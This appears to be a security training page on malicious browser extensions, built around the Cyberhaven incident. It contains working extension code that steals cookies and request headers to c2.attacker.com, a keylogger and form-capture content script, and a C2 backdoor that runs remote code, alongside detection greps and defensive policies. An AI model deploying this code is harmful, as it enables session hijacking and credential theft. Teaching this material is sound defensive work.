---
layout: training-page
title: "Browser Extension Attacks — Supply Chain, Session Theft & Persistence"
module: "Web Hacking"
tags:
  - browser-extension
  - supply-chain
  - session-tokens
  - chrome
  - manifest-v3
  - cyberhaven
  - persistence
  - cookie-theft
page_key: "web-browser-extension-attacks"
render_with_liquid: false
---

# Browser Extension Attacks — Supply Chain, Session Theft & Persistence

Browser extensions run in a privileged position: they can read all page content, intercept network requests, access cookies, and inject code into every tab. The December 2024 Cyberhaven incident — where a malicious Chrome extension update exfiltrated session tokens from 400,000 users — made this attack surface impossible to ignore.

---

## The Attack Surface

```
Extension privileges (manifest permissions):
  - cookies: read/write all cookies for any domain
  - webRequest: intercept and modify all HTTP traffic
  - storage: persistent browser storage
  - tabs: read URLs and inject scripts into tabs
  - scripting: execute JavaScript in any page context
  - declarativeNetRequest: redirect/block requests (MV3 equivalent)

Attack vectors:
  1. Malicious extension published to Chrome Web Store
  2. Legitimate extension account compromised → malicious update pushed
  3. Typosquatting (extension name/description mimics popular extension)
  4. Sideloaded extension via enterprise MDM or spear phish
  5. Extension dependency compromise (extensions loading remote scripts)
```

---

## Case Study: Cyberhaven (December 2024)

Cyberhaven, a data security company, had its Chrome extension compromised via a phishing attack on a developer's Google account. A malicious version (24.10.4) was published and distributed to ~400,000 users for approximately 24 hours.

**TTPs:**
- Phishing email targeted extension developer: "Your extension violates Chrome Web Store policy — verify now"
- Attacker gained access to developer's Google account (lacked FIDO2)
- Malicious extension update published via Chrome Web Store publisher console
- Payload: exfiltrated session cookies and auth tokens from targeted social media/SaaS sites
- C2: attacker-controlled domain (`cyberhavenext[.]pro`)
- Impact: AI assistant session tokens (ChatGPT, Claude), social media auth cookies

**Timeline:**
- Dec 24, 2024 18:32 UTC: Malicious version 24.10.4 published
- Dec 25, 2024 18:54 UTC: Malicious version detected and removed
- ~24 hours of active distribution to 400,000 users

---

## Extension Payload Analysis

What a malicious extension update can do immediately on install:

```javascript
// manifest.json (permissions the attacker needs):
{
  "permissions": ["cookies", "storage", "tabs"],
  "host_permissions": ["<all_urls>"],
  "background": {"service_worker": "background.js"}
}

// background.js — session token exfiltration:
// Steal all cookies from target domains on install:
const TARGET_DOMAINS = [
  "chat.openai.com", "claude.ai", "github.com",
  "accounts.google.com", "facebook.com", "twitter.com"
];

async function exfilCookies() {
  for (const domain of TARGET_DOMAINS) {
    const cookies = await chrome.cookies.getAll({domain: domain});
    if (cookies.length > 0) {
      await fetch("https://c2.attacker.com/collect", {
        method: "POST",
        body: JSON.stringify({domain, cookies, ts: Date.now()})
      });
    }
  }
}

// Also capture on every request matching target domains:
chrome.webRequest.onSendHeaders.addListener(
  (details) => {
    if (TARGET_DOMAINS.some(d => details.url.includes(d))) {
      fetch("https://c2.attacker.com/headers", {
        method: "POST",
        body: JSON.stringify({url: details.url, headers: details.requestHeaders})
      });
    }
  },
  {urls: ["<all_urls>"]},
  ["requestHeaders"]
);

chrome.runtime.onInstalled.addListener(exfilCookies);
```

---

## Content Script Injection Attack

```javascript
// Content script injected into every page — keylogger + form capture:
// Declared in manifest:
// "content_scripts": [{"matches": ["<all_urls>"], "js": ["content.js"]}]

// content.js:
document.addEventListener('keydown', function(e) {
  chrome.runtime.sendMessage({
    type: 'keylog',
    key: e.key,
    url: window.location.href,
    ts: Date.now()
  });
});

// Capture form submissions (credentials on login pages):
document.addEventListener('submit', function(e) {
  const form = e.target;
  const data = {};
  new FormData(form).forEach((v, k) => data[k] = v);
  chrome.runtime.sendMessage({type: 'form', url: window.location.href, data});
});
```

---

## Finding Malicious Extensions

### Static Analysis

```bash
# Download and unpack a CRX file:
curl -L "https://clients2.google.com/service/update2/crx?response=redirect&prodversion=90.0&x=id%3DEXTENSION_ID%26installsource%3Dondemand%26uc" \
  -o extension.crx
unzip extension.crx -d extension-unpacked/

# Extract all JavaScript:
find extension-unpacked/ -name "*.js" | xargs grep -l "fetch\|XMLHttpRequest\|eval\|atob"

# Look for suspicious patterns:
grep -rE "fetch\s*\(['\"]https?://(?!googleapis\.com|chrome\.google|microsoft\.com)" extension-unpacked/

# Check for obfuscated code:
grep -rE "eval\(|atob\(|String\.fromCharCode|\\\\x[0-9a-f]{2}" extension-unpacked/

# External resource loading (red flag in MV3):
grep -rE "importScripts\s*\(|fetch\s*\(.*\.js" extension-unpacked/

# Check manifest for over-broad permissions:
cat extension-unpacked/manifest.json | python3 -m json.tool | grep -A2 '"permissions"'
```

### Dynamic Analysis

```bash
# Run extension in isolated Chrome profile with mitmproxy:
mitmdump -p 8080 --ssl-insecure -w traffic.mitm &

chromium-browser \
  --proxy-server=http://127.0.0.1:8080 \
  --ignore-certificate-errors \
  --load-extension=/path/to/extension \
  --user-data-dir=/tmp/ext-test-profile &

# Monitor network traffic from extension:
mitmproxy -r traffic.mitm
# Look for unexpected POST requests to non-official domains
```

---

## Red Team: Simulating a Malicious Extension

For authorized red team engagements demonstrating the attack surface:

```bash
# 1. Build a test extension that beacons on install (no real exfil):
mkdir test-extension
cat > test-extension/manifest.json << 'EOF'
{
  "manifest_version": 3,
  "name": "Security Test Extension",
  "version": "1.0",
  "permissions": ["cookies", "storage"],
  "host_permissions": ["<all_urls>"],
  "background": {"service_worker": "background.js"}
}
EOF

cat > test-extension/background.js << 'EOF'
chrome.runtime.onInstalled.addListener(async () => {
  // Beacon only — no actual cookie exfiltration for red team test
  const payload = {
    hostname: navigator?.userAgent,
    installed: new Date().toISOString(),
    test: "dependency-beacon"
  };
  // Send to Burp Collaborator — confirms code execution
  await fetch("https://YOUR_COLLABORATOR_ID.burpcollaborator.net/ext", {
    method: "POST",
    body: JSON.stringify(payload)
  });
});
EOF

# 2. Load unpacked in Chrome:
# Chrome → Extensions → Developer mode → Load unpacked → select test-extension/

# 3. For enterprise deployment simulation (authorized engagement):
# Package as .crx and deploy via GPO ExtensionInstallForcelist
# Policy: HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist
```

---

## Persistence via Extension

```javascript
// Malicious extension as persistent backdoor:
// Service worker (MV3) — wakes on browser events, can't be easily killed

chrome.alarms.create("beacon", {periodInMinutes: 30});
chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === "beacon") {
    // Phone home every 30 minutes
    const response = await fetch("https://c2.attacker.com/check-in");
    const cmd = await response.json();
    if (cmd.action === "inject") {
      // Inject script into active tab on command
      const [tab] = await chrome.tabs.query({active: true, currentWindow: true});
      chrome.scripting.executeScript({
        target: {tabId: tab.id},
        func: new Function(cmd.code)
      });
    }
  }
});
```

---

## Detection & Defense

```bash
# Enterprise: enforce extension allowlist via Chrome Browser Cloud Management:
# Policy: ExtensionInstallAllowlist (only listed extensions can install)
# Policy: ExtensionInstallBlocklist (block all, then allowlist exceptions)

# GPO setting (Windows):
# Computer Configuration → Administrative Templates → Google Chrome → Extensions
# "Configure the list of force-installed apps and extensions"
# "Block extensions that request the following permissions" → block: cookies, webRequest

# Detection: monitor extension network traffic at proxy:
# Alert on extensions making POST requests to non-Google/Microsoft domains
# Alert on extensions sending base64-encoded blobs (cookie exfil pattern)

# Hunt for malicious extensions:
# Chrome sync logs in Google Workspace admin console → extension installs
# Browser telemetry (Falcon Sensor, CrowdStrike) tracks Chrome extension IDs

# Audit installed extensions:
# Chrome → chrome://extensions → export list
# Enterprise: use Google Admin SDK to enumerate installed extensions:
gam all users show extensions

# Quick inventory via PowerShell (Windows):
Get-ChildItem "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Extensions\" -ErrorAction SilentlyContinue | \
  Select-Object FullName
```

---

## Resources

- Cyberhaven incident report (Dec 2024) — `cyberhaven.com/blog/cyberhavens-chrome-extension-security-incident`
- Extension security analysis tooling — `github.com/nicowillis/malicious-extensions-list`
- Chrome Extensions security best practices — `developer.chrome.com/docs/extensions/mv3/security/`
- SquareX browser extension attack research — `sqrx.com/blog`
- Chrome Manifest V3 migration — `developer.chrome.com/docs/extensions/mv3/intro/mv3-overview/`
- Extension Manifest V3 fetch restrictions — `developer.chrome.com/docs/extensions/mv3/network-requests/`
